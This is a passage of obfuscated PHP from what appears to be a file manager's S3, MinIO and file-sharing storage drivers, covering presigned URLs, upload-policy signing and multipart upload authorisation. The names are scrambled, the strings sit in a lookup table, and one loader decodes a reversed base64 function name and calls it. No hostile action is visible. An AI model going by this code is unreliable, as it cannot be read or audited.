? $ö¹Ï¿Û½ : !1; } public function link($Ÿ·ú‡Ä, $™Öè³ı„ = array()) { return $this->getPreSignedURL($Ÿ·ú‡Ä, 3600 * 12, $™Öè³ı„); } private function getPreSignedURL($Óº„‡Õ, $—“çÏ¨ï, $“®–şê‘ = array(), $í¸ô‹ã = "\107\105\x54") { $è‰Û³ =& $_SERVER[åÄ¼Ùßš]; $Óº„‡Õ = trim($Óº„‡Õ, $è‰Û³[8]); if ($this->signVer == $è‰Û³[250]) { return $this->client->getPreSignedV2URL($this->bucket, $Óº„‡Õ, $—“çÏ¨ï, $í¸ô‹ã, $“®–şê‘); } return $this->client->getPreSignedV4URL($this->bucket, $Óº„‡Õ, $—“çÏ¨ï, array(), $í¸ô‹ã, $“®–şê‘); } public function fileOut($ÈÖí¿±, $¡†Ä¼ = false, $•‡™Èğ× = false, $©®Ğó¼Â = '') { $ÀĞÕû† =& $_SERVER[åÄ¼Ùßš]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÈÖí¿±, $¡†Ä¼, $•‡™Èğ×, $©®Ğó¼Â); } if (!$•‡™Èğ×) { $•‡™Èğ× = $this->pathThis($ÈÖí¿±); } $ĞñÅöß = get_file_mime(get_path_ext($•‡™Èğ×)); if ($ĞñÅöß == $ÀĞÕû†[251]) { return parent::fileOut($ÈÖí¿±, $¡†Ä¼, $•‡™Èğ×, $©®Ğó¼Â); } $¥ÁÚüÄ¨ = array($ÀĞÕû†[252] => $ĞñÅöß); if ($¡†Ä¼) { $¥ÁÚüÄ¨[$ÀĞÕû†[253]] = $ÀĞÕû†[254] . rawurlencode($•‡™Èğ×); } else { } $¤¾¼¾İ  = $this->link($ÈÖí¿±, $¥ÁÚüÄ¨); $this->fileOutLink($¤¾¼¾İ ); } public function fileOutServer($ŠÆ’öŸ, $Æ½™ÓÇØ = false, $§Òüßç = false, $ë«÷ú‘î = '') { parent::fileOut($ŠÆ’öŸ, $Æ½™ÓÇØ, $§Òüßç, $ë«÷ú‘î); } public function fileOutImageServer($ë—÷ÈŸì, $Ï½—ãœÖ = 250) { parent::fileOutImage($ë—÷ÈŸì, $Ï½—ãœÖ); } public function fileOutLink($­“İÙÍ) { $ïõåÚíÅ =& $_SERVER[åÄ¼Ùßš]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($ïõåÚíÅ[67], $ïõåÚíÅ[66], $ïõåÚíÅ[68])) && !get_url_scheme($this->endpoint) && substr($­“İÙÍ, 0, 7) == $ïõåÚíÅ[219]) { $­“İÙÍ = $ïõåÚíÅ[220] . substr($­“İÙÍ, 7); } header($ïõåÚíÅ[175] . $­“İÙÍ); die; } public function hashMd5($çú×äÅ‰, $›ŸïôÍí = '') { $ÁÔú‹è§ = $this->objectMeta($çú×äÅ‰); if (!$ÁÔú‹è§) { return !1; } $›ŸïôÍí = $›ŸïôÍí ? $›ŸïôÍí : _get($ÁÔú‹è§, $_SERVER[åÄ¼Ùßš][255]); return $›ŸïôÍí; } public function uploadFormData($¤©É¿Ï, $ŸÙûìõß = 3600) { $Ì†à‚œ =& $_SERVER[åÄ¼Ùßš]; if (!$this->_isClientAsync()) { $·õÀÕÌ = $this->getPreSignedURL($¤©É¿Ï, $ŸÙûìõß, array(), $Ì†à‚œ[256]); return array($Ì†à‚œ[209] => str_replace($Ì†à‚œ[219], $Ì†à‚œ[257], $·õÀÕÌ)); } if (isset($GLOBALS[$Ì†à‚œ[6]][$Ì†à‚œ[92]][$Ì†à‚œ[258]]) && $GLOBALS[$Ì†à‚œ[6]][$Ì†à‚œ[92]][$Ì†à‚œ[258]] == $Ì†à‚œ[231]) { return $this->uploadMultiData($¤©É¿Ï, $ŸÙûìõß); } if ($this->signVer == $Ì†à‚œ[250]) { return $this->uploadFormDataV2($¤©É¿Ï, $ŸÙûìõß); } return $this->uploadFormDataV4($¤©É¿Ï, $ŸÙûìõß); } public function uploadFormDataV2($Ò¹Ç¯›¤, $ØÖéÂ¨ = 3600) { $ÔÉ˜ñßß =& $_SERVER[åÄ¼Ùßš]; $ïäû–ş¶ = $this->pathFather($Ò¹Ç¯›¤); $ÜñÃÃ†ƒ = $this->client->getHttpUploadPostParams($this->bucket, $ïäû–ş¶, $ÔÉ˜ñßß[232], $ØÖéÂ¨); $íª¶À¤­ = array_merge((array) $ÜñÃÃ†ƒ, array($ÔÉ˜ñßß[259] => $ÔÉ˜ñßß[250], $ÔÉ˜ñßß[209] => $this->getHost())); if ($this->_isClientAsync()) { unset($íª¶À¤­[$ÔÉ˜ñßß[259]]); } return $íª¶À¤­; } public function uploadFormDataV4($°³ÍïçÀ, $Š†ÁÎ  = 3600) { $†Úê§¹Ö =& $_SERVER[åÄ¼Ùßš]; $”‹Çúñ‚ = $†Úê§¹Ö[232]; $ı·ãÃßê = $†Úê§¹Ö[260]; $ì¥ÚÄ½ = $†Úê§¹Ö[62]; $Ôªéú—« = gmdate($†Úê§¹Ö[261]); $½°ñàÑ = gmdate($†Úê§¹Ö[262]); $¬Æí¥Ş¦ = $†Úê§¹Ö[263]; $ˆÃ•è€ë = $Š†ÁÎ  . $†Úê§¹Ö[12]; $Òâ×Ô¬Õ = $†Úê§¹Ö[264]; $ÙøÃÅı» = array($this->accessKey, $½°ñàÑ, $this->region, $ì¥ÚÄ½, $¬Æí¥Ş¦); $ß´ø©àµ = implode($†Úê§¹Ö[8], $ÙøÃÅı»); $¥›‡ = array($†Úê§¹Ö[265] => gmdate($†Úê§¹Ö[266], strtotime($†Úê§¹Ö[267])), $†Úê§¹Ö[268] => array(array($†Úê§¹Ö[269] => $this->bucket), array($†Úê§¹Ö[270], $†Úê§¹Ö[271], $†Úê§¹Ö[12]), array($†Úê§¹Ö[270], $†Úê§¹Ö[272], $†Úê§¹Ö[12]), array($†Úê§¹Ö[273] => $Òâ×Ô¬Õ), array($†Úê§¹Ö[274] => $ß´ø©àµ), array($†Úê§¹Ö[275] => $ı·ãÃßê), array($†Úê§¹Ö[276] => $Ôªéú—«), array($†Úê§¹Ö[277] => $ˆÃ•è€ë))); $ğ±¥”¾á = base64_encode(json_encode($¥›‡)); $ƒ¯ÈÛ‰ = hash_hmac($†Úê§¹Ö[278], $½°ñàÑ, $†Úê§¹Ö[279] . $this->secret, !0); $Ô˜¼Ë = hash_hmac($†Úê§¹Ö[278], $this->region, $ƒ¯ÈÛ‰, !0); $‘œÌˆºß = hash_hmac($†Úê§¹Ö[278], $ì¥ÚÄ½, $Ô˜¼Ë, !0); $€¾óÅÁû = hash_hmac($†Úê§¹Ö[278], $¬Æí¥Ş¦, $‘œÌˆºß, !0); $ÖğËõ˜¿ = hash_hmac($†Úê§¹Ö[278], $ğ±¥”¾á, $€¾óÅÁû); $ı’µí¹µ = array($†Úê§¹Ö[249] => $†Úê§¹Ö[12], $†Úê§¹Ö[273] => $Òâ×Ô¬Õ, $†Úê§¹Ö[280] => $ğ±¥”¾á, $†Úê§¹Ö[274] => $ß´ø©àµ, $†Úê§¹Ö[275] => $ı·ãÃßê, $†Úê§¹Ö[276] => $Ôªéú—«, $†Úê§¹Ö[277] => $ˆÃ•è€ë, $†Úê§¹Ö[281] => $ÖğËõ˜¿, $†Úê§¹Ö[259] => $†Úê§¹Ö[250], $†Úê§¹Ö[209] => $this->getHost()); if ($this->_isClientAsync()) { unset($ı’µí¹µ[$†Úê§¹Ö[259]]); } return $ı’µí¹µ; } public function uploadMultiData($¹ğäŸËÀ, $ÄãçĞû = 3600) { $µŞàà© =& $_SERVER[åÄ¼Ùßš]; $è¢ôàÃÄ = $this->signVer == $µŞàà©[250] ? gmdate($µŞàà©[282]) : gmdate($µŞàà©[283]); $ÄªĞ° = array(); $µ‰¹ó§ = $this->client->getUploadId($this->bucket, $¹ğäŸËÀ, $ÄªĞ°); if (!$µ‰¹ó§) { return !1; } $«ñøò¿ = array($µŞàà©[284] => $µ‰¹ó§, $µŞàà©[209] => $this->getHost() . $µŞàà©[8] . $this->pathEncode($¹ğäŸËÀ), $µŞàà©[285] => $è¢ôàÃÄ, $µŞàà©[97] => $¹ğäŸËÀ, $µŞàà©[259] => $this->signVer); if ($this->_isClientAsync()) { unset($«ñøò¿[$µŞàà©[259]]); } return $«ñøò¿; } public function uploadMultiAuth($§Â¼Åñõ, $ªáŠûÇş = array()) { $û°ôúÔ¯ =& $_SERVER[åÄ¼Ùßš]; if ($this->signVer == $û°ôúÔ¯[250]) { if (isset($ªáŠûÇş[$û°ôúÔ¯[286]])) { return $this->uploadPartAuthV2($§Â¼Åñõ, $ªáŠûÇş); } return $this->uploadListAuthV2($§Â¼Åñõ, $ªáŠûÇş); } if (isset($ªáŠûÇş[$û°ôúÔ¯[286]])) { return $this->uploadPartAuthV4($§Â¼Åñõ, $ªáŠûÇş); } return $this->uploadListAuthV4($§Â¼Åñõ, $ªáŠûÇş); } public function uploadPartAuthV2($ÊñèÌ–‰, $´‘ŒŠ’” = array()) { $ŒÍ´ÓÜ¬ =& $_SERVER[åÄ¼Ùßš]; $ ÉëÜ— = $´‘ŒŠ’”[$ŒÍ´ÓÜ¬[97]]; $òë˜ô¶Ñ = gmdate($ŒÍ´ÓÜ¬[282]); $õ˜²İíÆ = array_intersect_key($´‘ŒŠ’”, array_flip(array($ŒÍ´ÓÜ¬[286], $ŒÍ´ÓÜ¬[284]))); ksort($õ˜²İíÆ); $ÜòÃŞñ» = $õ˜²İíÆ ? $ŒÍ´ÓÜ¬[76] . http_build_query($õ˜²İíÆ, null, $ŒÍ´ÓÜ¬[287], PHP_QUERY_RFC3986) : $ŒÍ´ÓÜ¬[12]; $’ÛäÄ…à = array($ŒÍ´ÓÜ¬[256], $ŒÍ´ÓÜ¬[12], $ŒÍ´ÓÜ¬[123], $ŒÍ´ÓÜ¬[12], "\170\x2d\x61\155\172\55\x64\141\x74\145\x3a{$òë˜ô¶Ñ}", $ŒÍ´ÓÜ¬[8] . $this->bucket . $ŒÍ´ÓÜ¬[8] . $this->pathEncode($ ÉëÜ—) . $ÜòÃŞñ»); $€›±°ƒî = implode($ŒÍ´ÓÜ¬[288], $’ÛäÄ…à); $ï×ì¿ù‡ = $this->client->__getSignature($€›±°ƒî); return array($ŒÍ´ÓÜ¬[289] => $ï×ì¿ù‡, $ŒÍ´ÓÜ¬[285] => $òë˜ô¶Ñ); } public function uploadListAuthV2($î™Ğ¼Õ¡, $ìï¸¯Ùº = array()) { $ÆÄ¨Ò¶µ =& $_SERVER[åÄ¼Ùßš]; $•Ï¿ÜÃ‘ = $ìï¸¯Ùº[$ÆÄ¨Ò¶µ[97]]; $‹íş‚Ë = $ìï¸¯Ùº[$ÆÄ¨Ò¶µ[284]]; $¬Â×µ« = $this->client->listParts($this->bucket, $•Ï¿ÜÃ‘, $‹íş‚Ë); if (!$¬Â×µ«) { return !1; } $‹õßÔ¨¢ = gmdate($ÆÄ¨Ò¶µ[282]); $™¼¬âäÛ = $ÆÄ¨Ò¶µ[290] . $‹íş‚Ë; $ç»¨›ã = array($ÆÄ¨Ò¶µ[291], $ÆÄ¨Ò¶µ[12], $ÆÄ¨Ò¶µ[123], $ÆÄ¨Ò¶µ[12], "\x78\x2d\141\155\172\x2d\144\141\x74\145\72{$‹õßÔ¨¢}", $ÆÄ¨Ò¶µ[8] . $this->bucket . $ÆÄ¨Ò¶µ[8] . $this->pathEncode($•Ï¿ÜÃ‘) . $™¼¬âäÛ); $‡Â Ã = implode($ÆÄ¨Ò¶µ[288], $ç»¨›ã); $ãÂøÎˆ§ = $this->client->__getSignature($‡Â Ã); return array($ÆÄ¨Ò¶µ[289] => $ãÂøÎˆ§, $ÆÄ¨Ò¶µ[285] => $‹õßÔ¨¢, $ÆÄ¨Ò¶µ[292] => $¬Â×µ«); } public function uploadPartAuthV4($•ÛáŠ, $Ï²àÈ¬© = array()) { $´Ó±·‹× =& $_SERVER[åÄ¼Ùßš]; $˜ä”ı™¾ = $Ï²àÈ¬©[$´Ó±·‹×[97]]; $½áü‹”é = array($´Ó±·‹×[276] => gmdate($´Ó±·‹×[283]), $´Ó±·‹×[293] => _get($Ï²àÈ¬©, $´Ó±·‹×[294], hash($´Ó±·‹×[278], $´Ó±·‹×[12]))); $ºÍ¢ÈÏ¾ = explode($´Ó±·‹×[211], $this->getHost()); $¯òü±“• = array($´Ó±·‹×[295] => $ºÍ¢ÈÏ¾[1], $´Ó±·‹×[296] => $´Ó±·‹×[12], $´Ó±·‹×[249] => $´Ó±·‹×[123], $´Ó±·‹×[297] => $Ï²àÈ¬©[$´Ó±·‹×[79]]); $éŒÚÜş÷ = $´Ó±·‹×[256]; $ãñíªÉ = $´Ó±·‹×[8] . $this->pathEncode($˜ä”ı™¾); $¨îÉ¢æº = array_intersect_key($Ï²àÈ¬©, array_flip(array($´Ó±·‹×[286], $´Ó±·‹×[284]))); $…—¬¡Àˆ = $this->client->__getSignatureV4($½áü‹”é, $¯òü±“•, $éŒÚÜş÷, $ãñíªÉ, $¨îÉ¢æº); return array($´Ó±·‹×[289] => $…—¬¡Àˆ, $´Ó±·‹×[293] => $½áü‹”é[$´Ó±·‹×[293]], $´Ó±·‹×[285] => $½áü‹”é[$´Ó±·‹×[276]]); } public function uploadListAuthV4($á‰¯ª ¡, $­Ú¤Âè = array()) { $¶É£ÈÆÆ =& $_SERVER[åÄ¼Ùßš]; $ú÷íÄâğ = $­Ú¤Âè[$¶É£ÈÆÆ[97]]; $Úá’ÔºÏ = $­Ú¤Âè[$¶É£ÈÆÆ[284]]; $§ûğâ±¸ = $this->client->listParts($this->bucket, $ú÷íÄâğ, $Úá’ÔºÏ); if (!$§ûğâ±¸) { return !1; } $•Ö‰µÎı = $¶É£ÈÆÆ[298]; foreach ($§ûğâ±¸ as $ äêºñ´) { $•Ö‰µÎı .= $¶É£ÈÆÆ[299] . "\x3c\x50\x61\x72\x74\116\x75\155\x62\x65\162\x3e{$ äêºñ´[$¶É£ÈÆÆ[300]]}\x3c\x2f\120\x61\x72\164\x4e\165\x6d\x62\x65\162\76\xa" . "\x3c\105\124\x61\147\76{$ äêºñ´[$¶É£ÈÆÆ[301]]}\74\x2f\x45\x54\x61\147\x3e\12" . $¶É£ÈÆÆ[302]; } $•Ö‰µÎı .= $¶É£ÈÆÆ[303]; $€Õ íö = array($¶É£ÈÆÆ[276] => gmdate($¶É£ÈÆÆ[283]), $¶É£ÈÆÆ[293] => hash($¶É£ÈÆÆ[278], $•Ö‰µÎı)); $­ïûï§× = explode($¶É£ÈÆÆ[211], $this->getHost()); $–¯Óš±à = array($¶É£ÈÆÆ[295] => $­ïûï§×[1], $¶É£ÈÆÆ[249] => $¶É£ÈÆÆ[123], $¶É£ÈÆÆ[297] => strlen($•Ö‰µÎı)); $‹‘Ç€¼ = $¶É£ÈÆÆ[291]; $–ä´ªÚ = $¶É£ÈÆÆ[8] . $this->pathEncode($ú÷íÄâğ); $²Ì¾«ÈÂ = array($¶É£ÈÆÆ[284] => $Úá’ÔºÏ); $’éß¾é = $this->client->__getSignatureV4($€Õ íö, $–¯Óš±à, $‹‘Ç€¼, $–ä´ªÚ, $²Ì¾«ÈÂ); return array($¶É£ÈÆÆ[289] => $’éß¾é, $¶É£ÈÆÆ[293] => $€Õ íö[$¶É£ÈÆÆ[293]], $¶É£ÈÆÆ[285] => $€Õ íö[$¶É£ÈÆÆ[276]], $¶É£ÈÆÆ[292] => $§ûğâ±¸); } private function _isClientAsync() { $Ãıİ¾ÚÓ =& $_SERVER[åÄ¼Ùßš]; static $ŠàÉ’¿¬ = null; if ($ŠàÉ’¿¬ === null) { $°ÂÙÀ® = isset($_REQUEST[$Ãıİ¾ÚÓ[304]]) ? json_decode($_REQUEST[$Ãıİ¾ÚÓ[304]], !0) : !1; $ŠàÉ’¿¬ = $°ÂÙÀ® && _get($°ÂÙÀ®, $Ãıİ¾ÚÓ[305]) == $Ãıİ¾ÚÓ[306]; } return $ŠàÉ’¿¬; } public function getHost() { $ÇàÌØãÉ =& $_SERVER[åÄ¼Ùßš]; $Ì¯Èµşà = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($ÇàÌØãÉ[70], $ÇàÌØãÉ[64], $ÇàÌØãÉ[69], $ÇàÌØãÉ[62]))) { return $Ì¯Èµşà . $ÇàÌØãÉ[8] . $this->bucket; } if ($this->osType == $ÇàÌØãÉ[62] && !is_domain($Ì¯Èµşà)) { return $Ì¯Èµşà . $ÇàÌØãÉ[8] . $this->bucket; } $Ì¯Èµşà = explode($ÇàÌØãÉ[211], $Ì¯Èµşà); return $Ì¯Èµşà[0] . $ÇàÌØãÉ[211] . $this->bucket . $ÇàÌØãÉ[10] . $Ì¯Èµşà[1]; } public function size($ˆ¦â¸ËÏ) { $àä—­ÑÂ = $this->objectMeta($ˆ¦â¸ËÏ); return $àä—­ÑÂ ? $àä—­ÑÂ[$_SERVER[åÄ¼Ùßš][79]] : 0; } public function info($»»ÌôŸ½) { if ($this->isFolder($»»ÌôŸ½)) { return $this->folderInfo($»»ÌôŸ½); } else { if ($this->isFile($»»ÌôŸ½)) { return $this->fileInfo($»»ÌôŸ½); } } return !1; } public function exist($Şº’ŒÑâ) { return $this->isFile($Şº’ŒÑâ) || $this->isFolder($Şº’ŒÑâ); } public function isFile($ÕçüÜê) { return !$this->isFolder($ÕçüÜê) && $this->objectMeta($ÕçüÜê); } public function isFolder($óöŸ”Ö) { return $this->cacheMethod($_SERVER[åÄ¼Ùßš][180], $óöŸ”Ö); } protected function objectMeta($¤ëú¼‰) { return $this->cacheMethod($_SERVER[åÄ¼Ùßš][182], $¤ëú¼‰); } protected function _objectMeta($´³Åõæ®) { $øŸåÓï =& $_SERVER[åÄ¼Ùßš]; $´³Åõæ® = rtrim($´³Åõæ®, $øŸåÓï[8]); try { $íÃâ—Í˜ = $this->client->getObjectInfo($this->bucket, $´³Åõæ®); if (!isset($íÃâ—Í˜[$øŸåÓï[255]]) && isset($íÃâ—Í˜[$øŸåÓï[307]])) { $íÃâ—Í˜[$øŸåÓï[255]] = $íÃâ—Í˜[$øŸåÓï[307]]; } } catch (Exception $ˆò—ïƒ) { $íÃâ—Í˜ = !1; } if (!$íÃâ—Í˜) { } return $íÃâ—Í˜; } protected function _isFolder($¥™Ãßå) { $§Ú¡şáÆ =& $_SERVER[åÄ¼Ùßš]; $¥™Ãßå = rtrim($¥™Ãßå, $§Ú¡şáÆ[8]) . $§Ú¡şáÆ[8]; if ($¥™Ãßå == $§Ú¡şáÆ[12] || $¥™Ãßå == $§Ú¡şáÆ[8]) { return !0; } $™ƒÙŠ” = $this->client->getBucket($this->bucket, $¥™Ãßå, null, 1); if (empty($™ƒÙŠ”[$§Ú¡şáÆ[239]])) { return !1; } $ÒÉ´ŒÏµ = $™ƒÙŠ”[$§Ú¡şáÆ[239]][0][$§Ú¡şáÆ[32]]; return stripos($ÒÉ´ŒÏµ, $¥™Ãßå) === 0 ? !0 : !1; if (substr($ÒÉ´ŒÏµ, -1) == $§Ú¡şáÆ[8]) { return !0; } if (get_path_this($ÒÉ´ŒÏµ) == get_path_this($¥™Ãßå)) { return !1; } return !0; } public function listObject($’»–Ú®‚) { return $this->fileList($’»–Ú®‚, $_SERVER[åÄ¼Ùßš][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($­¼®–¤ş) { $ôÅ²Âû =& $_SERVER[åÄ¼Ùßš]; parent::__construct($­¼®–¤ş); $this->setSignVersion($ôÅ²Âû[250]); if (!$this->region) { $this->region = $ôÅ²Âû[308]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $ßä¸µ‰¦ = $this->getBktRegion(); return $this->region == $ßä¸µ‰¦ ? !0 : !1; } public function uploadFormData($Ææç™¿¡, $©ôåï÷Ø = 3600) { $—§éˆ€˜ =& $_SERVER[åÄ¼Ùßš]; $ë•ïŒƒ¡ = $—§éˆ€˜[232]; $´ ¿íò¢ = $—§éˆ€˜[260]; $€ğ”¡ëğ = $—§éˆ€˜[62]; $”³ŞÚäµ = gmdate($—§éˆ€˜[261]); $±âÊ‹Ñş = gmdate($—§éˆ€˜[262]); $‹ªø¢  = $—§éˆ€˜[263]; $Î¶Ôì±“ = $©ôåï÷Ø . $—§éˆ€˜[12]; $¦¹Ÿ•€€ = $—§éˆ€˜[264]; $üÚÅ†õÔ = array($this->accessKey, $±âÊ‹Ñş, $this->region, $€ğ”¡ëğ, $‹ªø¢ ); $ìœ¯î¨Õ = implode($—§éˆ€˜[8], $üÚÅ†õÔ); $£é·û¢ƒ = array($—§éˆ€˜[265] => gmdate($—§éˆ€˜[266], strtotime($—§éˆ€˜[267])), $—§éˆ€˜[268] => array(array($—§éˆ€˜[269] => $this->bucket), array($—§éˆ€˜[309] => $ë•ïŒƒ¡), array($—§éˆ€˜[270], $—§éˆ€˜[271], $—§éˆ€˜[12]), array($—§éˆ€˜[270], $—§éˆ€˜[272], $—§éˆ€˜[12]), array($—§éˆ€˜[270], $—§éˆ€˜[310], $—§éˆ€˜[12]), array($—§éˆ€˜[273] => $¦¹Ÿ•€€), array($—§éˆ€˜[274] => $ìœ¯î¨Õ), array($—§éˆ€˜[275] => $´ ¿íò¢), array($—§éˆ€˜[276] => $”³ŞÚäµ), array($—§éˆ€˜[277] => $Î¶Ôì±“))); $Ù¡ı¯Ş” = base64_encode(json_encode($£é·û¢ƒ)); $Å½ó†ÁÖ = hash_hmac($—§éˆ€˜[278], $±âÊ‹Ñş, $—§éˆ€˜[279] . $this->secret, !0); $Ü˜•úÔÃ = hash_hmac($—§éˆ€˜[278], $this->region, $Å½ó†ÁÖ, !0); $·ÊÕ™¢ö = hash_hmac($—§éˆ€˜[278], $€ğ”¡ëğ, $Ü˜•úÔÃ, !0); $œ¼û²ê± = hash_hmac($—§éˆ€˜[278], $‹ªø¢ , $·ÊÕ™¢ö, !0); $ÄÖµˆÑ‘ = hash_hmac($—§éˆ€˜[278], $Ù¡ı¯Ş”, $œ¼û²ê±); $Ú˜µµæá = array($—§éˆ€˜[249] => $—§éˆ€˜[12], $—§éˆ€˜[297] => $—§éˆ€˜[12], $—§éˆ€˜[309] => $ë•ïŒƒ¡, $—§éˆ€˜[273] => $¦¹Ÿ•€€, $—§éˆ€˜[280] => $Ù¡ı¯Ş”, $—§éˆ€˜[311] => $ìœ¯î¨Õ, $—§éˆ€˜[312] => $´ ¿íò¢, $—§éˆ€˜[313] => $”³ŞÚäµ, $—§éˆ€˜[314] => $Î¶Ôì±“, $—§éˆ€˜[315] => $ÄÖµˆÑ‘, $—§éˆ€˜[209] => $this->getHost()); return $Ú˜µµæá; } } goto b­„²ÁŞ‘; a‚Ê„†Ò¢: define($_SERVER[åÄ¼Ùßš][320], 3); define($_SERVER[åÄ¼Ùßš][321], 1); define($_SERVER[åÄ¼Ùßš][322], 0); goto bå øâÈ´; f°ÀÎ«ˆôÛ: $fileSize = strrev(base64_decode($_SERVER[³Ì„‘öã][0])); function binCheckNeq($Ö²·ƒ», $ıı«şüæ) { return $Ö²·ƒ» != $ıı«şüæ; } $_SERVER[$_SERVER[³Ì„‘öã][1]] = $fileSize($_SERVER[$_SERVER[³Ì„‘öã][2]]); goto fÑÊ¯›‘ÑŞ; aÑ­ß¼: class PathDriverDriverShareItem { public function __construct($µîÕ¹ŞÄ) { $this->pathParse = $µîÕ¹ŞÄ; } public function __call($²Ï²êÖè, $ñ–ì¡²û) { $ÑÔ´ıÀ =& $_SERVER[åÄ¼Ùßš]; if (method_exists($this, $²Ï²êÖè)) { return; } $ª’«Ùã« = call_user_func_array(array($ÑÔ´ıÀ[1475], $²Ï²êÖè), $ñ–ì¡²û); $ØİÄÜÀ— = array($ÑÔ´ıÀ[1476], $ÑÔ´ıÀ[1477], $ÑÔ´ıÀ[1478], $ÑÔ´ıÀ[1479], $ÑÔ´ıÀ[634], $ÑÔ´ıÀ[636], $ÑÔ´ıÀ[1480], $ÑÔ´ıÀ[110], $ÑÔ´ıÀ[1481], $ÑÔ´ıÀ[1482]); if (in_array($²Ï²êÖè, $ØİÄÜÀ—)) { $ª’«Ùã« = $this->getPathOuter($ª’«Ùã«); } return $ª’«Ùã«; } public function copy($’¯ï“˜¦, $û‘ş—š, $‘ŸŠ¡ù² = false, $¬ÍöÃÍ³ = false) { return $this->copyMove($’¯ï“˜¦, $û‘ş—š, $‘ŸŠ¡ù², $_SERVER[åÄ¼Ùßš][634], $¬ÍöÃÍ³); } public function move($æ¿Ê†”, $’™·Úû, $«Œü‹£Ã = false, $°€¥²Ñ» = false) { return $this->copyMove($æ¿Ê†”, $’™·Úû, $«Œü‹£Ã, $_SERVER[åÄ¼Ùßš][636], $°€¥²Ñ»); } private function copyMove($üÒğÏ©Å, $Üšù¡¹Ÿ, $ßÉ®’Ö€, $ûåãÂ“, $öûÇëÅ = false) { $Ä¼¡á†Ş =& $_SERVER[åÄ¼Ùßš]; $‘¾³æŒõ = $Üšù¡¹Ÿ; $Õ³à‹Û = IO::driverMake($Üšù¡¹Ÿ); if ($Õ³à‹Û->pathParse[$Ä¼¡á†Ş[1268]]) { $Üšù¡¹Ÿ = $Õ³à‹Û->pathParse[$Ä¼¡á†Ş[1268]]; } else { $Üšù¡¹Ÿ = $‘¾³æŒõ; } $…­¿ª¤ = IO::copyMove($üÒğÏ©Å, $Üšù¡¹Ÿ, $ßÉ®’Ö€, $ûåãÂ“, $öûÇëÅ); $…­¿ª¤ = $this->getPathOuter($…­¿ª¤); return $…­¿ª¤; } public function pathThis($Ï¬«³å¯) { return get_path_this($this->pathParse[$_SERVER[åÄ¼Ùßš][87]]); } public function pathFather($Ğœ“ò¦§) { return get_path_father($this->pathParse[$_SERVER[åÄ¼Ùßš][87]]); } public function iconvSystem($‘ˆººÏ¦) { return $‘ˆººÏ¦; } protected function infoParse($éÓÑâÈŞ, $ıÉ•¾çš = false) { $æ×ª¯½½ =& $_SERVER[åÄ¼Ùßš]; $ÜŞ™ç¬› = $this->pathParse[$æ×ª¯½½[573]][$æ×ª¯½½[1295]] . $this->pathParse[$æ×ª¯½½[1287]]; if ($ıÉ•¾çš) { $ñòòè¾Ü = IO::infoWithChildren($ÜŞ™ç¬›); } else { $ñòòè¾Ü = IO::info($ÜŞ™ç¬›); } $Ù·ÂıÌ¥ = $this->pathParse[$æ×ª¯½½[573]]; return Action($æ×ª¯½½[1473])->_shareItemeParse($ñòòè¾Ü, $Ù·ÂıÌ¥); } public function listAll($ÌÇ®‰´á) { $íœªêÔî =& $_SERVER[åÄ¼Ùßš]; $™Ì§•£× = IO::listAll($ÌÇ®‰´á); $šŞÒÄñÁ = rtrim($this->pathParse[$íœªêÔî[573]][$íœªêÔî[1295]], $íœªêÔî[8]); foreach ($™Ì§•£× as &$¢óÂ¥ä‚) { $¢óÂ¥ä‚[$íœªêÔî[87]] = $this->pathDriver . $íœªêÔî[8] . ltrim(substr($¢óÂ¥ä‚[$íœªêÔî[87]], strlen($šŞÒÄñÁ)), $íœªêÔî[8]); } unset($¢óÂ¥ä‚); return $™Ì§•£×; } public function listAllSimple($æŠáµ´Ô, $¬ŞİéŠ = false) { $¾ÉŠÃŸú =& $_SERVER[åÄ¼Ùßš]; $§ïÁÆ„ = $this->listAll($æŠáµ´Ô); $·ï«ø£® = $this->pathParse[$¾ÉŠÃŸú[507]]; if (trim($·ï«ø£®, $¾ÉŠÃŸú[8]) == trim(get_path_father($·ï«ø£®), $¾ÉŠÃŸú[8])) { $¬ŞİéŠ = !0; } return IO::init($¾ÉŠÃŸú[12])->listAllSimpleMake($§ïÁÆ„, $·ï«ø£®, $¬ŞİéŠ); } public function getPathOuter($Ì¿ÓÄñÃ) { $Ş’è¯‰Á =& $_SERVER[åÄ¼Ùßš]; $À†©šó¨ = KodIO::parse($Ì¿ÓÄñÃ); if ($À†©šó¨[$Ş’è¯‰Á[33]] == KodIO::KOD_SHARE_ITEM) { return $À†©šó¨[$Ş’è¯‰Á[87]]; } $ƒÃ†Ö™ = KodIO::clear($Ì¿ÓÄñÃ); $œÛ¶¬´ = KodIO::clear($this->pathParse[$Ş’è¯‰Á[573]][$Ş’è¯‰Á[1295]]); $´Ûá¿£ = substr($ƒÃ†Ö™, strlen($œÛ¶¬´)); if (substr($ƒÃ†Ö™, 0, strlen($œÛ¶¬´)) != $œÛ¶¬´) { return !1; } return $this->pathParse[$Ş’è¯‰Á[1288]] . $Ş’è¯‰Á[8] . ltrim($´Ûá¿£, $Ş’è¯‰Á[8]); } public function getType() { $Ş¾×Ø» =& $_SERVER[åÄ¼Ùßš]; $Ñôœü±û = str_replace($Ş¾×Ø»[77], $Ş¾×Ø»[12], get_class($this)); return strtolower($Ñôœü±û); } public function isOsDriver($³á½ƒ¤) { return IO::isOsDriver($³á½ƒ¤); } public function info($Ïàœüú’) { return $this->infoParse($Ïàœüú’); } public function infoAuth($õå¢ù—ò) { return $this->infoParse($õå¢ù—ò); } public function infoWithChildren($ûÀ ó²ö) { return $this->infoParse($ûÀ ó²ö, !0); } public function infoFull($»ÀùÓêÖ) { return $this->infoParse($»ÀùÓêÖ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($Óá•ÑÎ¿) { $this->pathParse = $Óá•ÑÎ¿; } protected function infoParse($Êİ»”ù, $ƒı¿ı¯´ = false) { $éµ²õù =& $_SERVER[åÄ¼Ùßš]; return Action($éµ²õù[1294])->sharePathInfo($this->pathParse[$éµ²õù[87]], !0, $ƒı¿ı¯´); } public function listPath($òÚ¹¼Ü, $ã‡©áÌö = false) { $°¾ú‚Ö¦ =& $_SERVER[åÄ¼Ùßš]; $Â³ÏĞ­ = IO::listPath($òÚ¹¼Ü, $ã‡©áÌö); if 